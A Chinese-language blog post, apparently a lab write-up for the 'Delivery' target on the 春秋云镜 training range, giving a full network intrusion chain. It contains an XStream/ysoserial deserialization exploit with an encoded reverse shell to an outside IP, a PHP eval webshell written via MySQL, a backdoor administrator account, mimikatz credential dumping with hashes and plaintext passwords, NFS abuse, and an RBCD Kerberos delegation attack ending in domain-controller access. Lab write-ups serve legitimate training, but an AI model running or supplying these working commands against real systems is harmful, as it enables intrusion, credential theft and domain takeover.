

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
    <title>Delivery - MoonlitSyntax</title>

    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>


    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
</head>

<body class="l-body">

<nav class="c-nav">
    <a href="/" class="c-nav__link">首页</a>
    <a href="/archives" class="c-nav__link">归档</a>
    <a href="/tags" class="c-nav__link">标签</a>
    <a href="/categories" class="c-nav__link">分类</a>
    <a href="/links" class="c-nav__link">友链</a>
    <a href="/about" class="c-nav__link">关于</a>
    <button id="search-button" class="c-nav__search-btn">
        <i class="fas fa-search"></i>
    </button>
</nav>


<div class="l-container">
    <div class="l-nav-spacer"></div>
    <main class="l-main">
        
<div class="c-post">
    <aside class="c-post__toc">
        <h2 class="c-post__toc-title">目录</h2>
        
        <div class="c-post__toc-empty">
            <i class="fas fa-info-circle"></i> 本文暂无小节
        </div>
        
    </aside>
    <div class="c-post__main">
        <header class="c-post__header">
            <h1 class="c-post__title">Delivery</h1>
            <div class="c-post__meta">
                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
            </div>
            <div class="c-post__tags">
                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
            </div>
            <div class="c-post__description">
                春秋云镜靶场
            </div>
        </header>

        <article class="c-post__content prose"><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419221942.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240419221942.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
<p>一眼java反序列化</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">        &lt;dependency&gt;
</span></span><span class="line"><span class="cl">            &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
</span></span><span class="line"><span class="cl">            &lt;artifactId&gt;xstream&lt;/artifactId&gt;
</span></span><span class="line"><span class="cl">            &lt;version&gt;1.4.16&lt;/version&gt;
</span></span><span class="line"><span class="cl">        &lt;/dependency&gt;
</span></span></code></pre></div></div><p>XStream是一个轻量级、简单易用的开源Java类库，它主要用于将对象序列化成XML（JSON）或反序列化为对象。</p>
<p>XStream 在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.16 及之前版本黑名单存在缺陷，攻击者可利用<code>sun.rmi.registry.RegistryImpl_Stub</code>构造RMI请求，进而执行任意命令。</p>
<p>开放一下1099端口</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0OS4xNDIuMTk1Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;
</span></span></code></pre></div></div><p>扫内网</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.13.14    is alive 本机 x
</span></span><span class="line"><span class="cl">(icmp) Target 172.22.13.6     is alive [+]DC XIAORANG\WIN-DC 
</span></span><span class="line"><span class="cl">(icmp) Target 172.22.13.28    is alive WIN-HAUWOLAO.xiaorang.lab x
</span></span><span class="line"><span class="cl">(icmp) Target 172.22.13.57    is alive web 
</span></span></code></pre></div></div><p>OK,下一步打web</p>
<p>不对额,没看到</p>
<p><code>[+] mysql:172.22.13.28:3306:root 123456</code></p>
<p>直接navicat连</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">show variables like &#34;secure_file_priv&#34;;
</span></span></code></pre></div></div><p>结果为空,可以写文件</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">show variables like &#34;%general%&#34;
</span></span></code></pre></div></div><p><code>C:\phpstudy_pro\Extensions\MySQL5.7.26\data\WIN-HAUWOLAO.log</code></p>
<p>不用提权了</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">select &#34;&lt;?php eval($_POST[1]);?&gt;&#34; into outfile &#34;C:/phpstudy_pro/WWW/1.php&#34;;
</span></span></code></pre></div></div><p>写个马呗</p>
<p>如果在linux想到弹shell,在Windows里就要想要建用户的</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">net user dionysus QWE123qwe. /add
</span></span><span class="line"><span class="cl">net localgroup administrators dionysus /add
</span></span></code></pre></div></div><p>抓,都可以抓</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">mimikatz.exe &#34;privilege::debug&#34; &#34;log&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34; &gt; test.txt
</span></span></code></pre></div></div><p>本机的机器hash<code>83d3718f0ab021ac3b2c8e3ae8cde571</code></p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">Authentication Id : 0 ; 85495 (00000000:00014df7)
</span></span><span class="line"><span class="cl">Session           : Service from 0
</span></span><span class="line"><span class="cl">User Name         : chenglei
</span></span><span class="line"><span class="cl">Domain            : XIAORANG
</span></span><span class="line"><span class="cl">Logon Server      : WIN-DC
</span></span><span class="line"><span class="cl">Logon Time        : 2024/4/19 22:15:47
</span></span><span class="line"><span class="cl">SID               : S-1-5-21-3269458654-3569381900-10559451-1105
</span></span><span class="line"><span class="cl">	msv :	
</span></span><span class="line"><span class="cl">	 [00000003] Primary
</span></span><span class="line"><span class="cl">	 * Username : chenglei
</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
</span></span><span class="line"><span class="cl">	 * NTLM     : 0c00801c30594a1b8eaa889d237c5382
</span></span><span class="line"><span class="cl">	 * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
</span></span><span class="line"><span class="cl">	 * DPAPI    : 89b179dc738db098372c365602b7b0f4
</span></span><span class="line"><span class="cl">	tspkg :	
</span></span><span class="line"><span class="cl">	wdigest :	
</span></span><span class="line"><span class="cl">	 * Username : chenglei
</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
</span></span><span class="line"><span class="cl">	 * Password : (null)
</span></span><span class="line"><span class="cl">	kerberos :	
</span></span><span class="line"><span class="cl">	 * Username : chenglei
</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG.LAB
</span></span><span class="line"><span class="cl">	 * Password : Xt61f3LBhg1
</span></span><span class="line"><span class="cl">	ssp :	
</span></span><span class="line"><span class="cl">	credman :
</span></span></code></pre></div></div><p><code>全局组成员             *ACL Admin            *Domain Users</code></p>
<p>等会,先返回去打centos</p>
<p>nfs提权,tryhackme写过了</p>
<p>换个源,装个showmount</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sudo sed -i &#39;s/archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list
</span></span><span class="line"><span class="cl">sudo apt-get update
</span></span><span class="line"><span class="cl">apt-get install nfs-common -y
</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">root@ubuntu:~# showmount -e 172.22.13.57
</span></span><span class="line"><span class="cl">Export list for 172.22.13.57:
</span></span><span class="line"><span class="cl">/home/joyce *
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">直接挂上去
</span></span><span class="line"><span class="cl">mount -t nfs 172.22.13.57:/ ./a -o nolock
</span></span></code></pre></div></div><p>写ssh公钥,还是一样的连上去,然后提权</p>
<p>还是nfs
<code>xiaorang.lab/zhangwen\QT62f3gBhK1</code></p>
<p>ACL,名文明码都给抓出来</p>
<p><code>proxychains bloodhound-python -u zhangwen -p 'QT62f3gBhK1' -d xiaorang.lab -c all -ns 172.22.13.6 --zip --dns-tcp</code></p>
<p>草</p>
<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains addcomputer.py xiaorang.lab/chenglei:&#39;Xt61f3LBhg1&#39; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#39;TEST$&#39; -computer-pass &#39;P@ssw0rd&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">proxychains rbcd.py xiaorang.lab/chenglei:&#39;Xt61f3LBhg1&#39; -dc-ip 172.22.13.6 -action write -delegate-to &#39;WIN-DC$&#39; -delegate-from &#39;TEST$&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">proxychains getST.py xiaorang.lab/&#39;TEST$&#39;:&#39;P@ssw0rd&#39; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6
</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">export KRB5CCNAME=Administrator.ccache
</span></span><span class="line"><span class="cl">echo &#34;172.22.13.6 WIN-DC.xiaorang.lab&#34; &gt;&gt; /etc/hosts
</span></span><span class="line"><span class="cl">p4 psexec.py xiaorang.lab/administrator@WIN-DC.xiaorang.lab -k -no-pass -target-ip 172.22.13.6 -codec gbk
</span></span></code></pre></div></div></article>

        <nav class="c-post__nav">
            
            <a href="/post/certify" class="c-post__nav-card c-post__nav-card--prev">
                <h3>‹ 上一篇</h3>
                <p class="c-post__nav-title">Certify</p>
            </a>
            

            
            <a href="/post/flarum" class="c-post__nav-card c-post__nav-card--next">
                <h3>下一篇 ›</h3>
                <p class="c-post__nav-title">Flarum</p>
            </a>
            
        </nav>
    </div>
</div>

    </main>
    <footer class="c-footer">
        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
        <div class="c-footer__copy">
            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
        </div>
    </footer>
</div>

<div id="algolia-search-mask" class="c-search-mask"></div>
<div id="algolia-search-modal" class="c-search-modal">
    <div class="c-search-modal__box">
        <div class="c-search-modal__header">搜索</div>
        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
        <div id="algolia-search-results" class="c-search-modal__results"></div>
        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
        <hr class="c-search-modal__divider" />
    </div>
</div>

<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>


<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
</body>
</html>

